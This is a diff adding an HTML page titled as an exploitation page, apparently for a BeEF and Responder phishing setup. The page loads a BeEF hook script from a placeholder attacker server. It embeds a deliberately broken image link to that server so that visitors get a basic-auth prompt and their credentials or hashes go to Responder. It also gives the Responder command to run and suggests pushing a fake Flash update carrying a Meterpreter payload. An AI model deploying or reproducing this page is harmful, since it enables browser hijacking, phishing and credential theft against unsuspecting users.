@@ -1,0 +1,18 @@
+<html>
+<head>
+	<title>Other Browser Type Exploitation Page</title>
+	<script src="http://yourserver:3000/hook.js"></script>
+</head>
+<body>
+
+<p>If you were redirected here, your BeEF Autorun Rules detected the browser as something other than Internet Explorer.</p>
+<p>Other browsers won't work with Responder's SMB method, so we'll try another method: prompting the user with a popup box asking for a username and a password. Its not silent like the IE method. It looks much more like a Phish. This, of course, is just an example of using the rules engine. You could just as easily add a rule that doesn't redirect the page, but pushes a fake Flash update with a Meterpreter payload.</p>
+
+<p>Here we'll hit our server's HTTP port to load an image that doesn't exist. Any data entered in the username or password fields will be sent to Responder. Remember to run "python responder.py --lm -f -I eth0" on your server.</p>
+
+<img src="http://yourserverip/a_share_that_doesnt_exist/image.jpg">
+
+<!-- Yep! This is absolutely meant a broken link. It'll look like a broken image. Hide it as needed; we just need the browser to try to hit that non-existant HTTP resource, get a basic auth prompt, and send Responder some hashes.-->
+
+</body>
+</html>
